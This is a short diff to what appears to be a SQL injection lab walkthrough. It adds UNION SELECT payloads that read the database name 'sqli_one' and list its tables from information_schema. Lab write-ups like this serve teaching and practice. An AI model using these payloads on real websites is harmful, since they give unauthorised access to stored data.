@@ -54,4 +54,7 @@ You'll now see the article is just made up of the result from the UNION select r
 
     0 UNION SELECT 1,2,database()
 ![datanase](images/12-database.png)<br/>
-It now shows the name of the database, which is `sqli_one`.
+It now shows the name of the database, which is `sqli_one`.<br/>
+
+    0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+![tables name](images/13-get-tables-name.png)<br/>
